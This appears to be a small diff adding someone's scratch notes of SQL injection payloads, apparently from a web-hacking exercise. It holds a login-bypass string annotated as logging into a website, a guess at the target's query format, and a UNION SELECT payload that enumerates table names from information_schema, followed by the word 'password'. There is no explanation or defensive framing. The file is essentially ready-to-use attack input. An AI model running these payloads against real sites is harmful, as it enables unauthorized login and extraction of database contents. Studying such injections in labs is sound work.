@@ -1,0 +1,13 @@
+' OR 1=1; -- test
+^^^^ logs us into website
+
+
+
+Format of query
+SELECT id, pname, code, category, BU, owner from TABLE_NAME WHERE category like '%" ORDER BY id --test %'
+
+test query
+' OR 1=1 UNION SELECT 1,1,1,1,table_name FROM information_schema.tables; -- test
+
+
+password
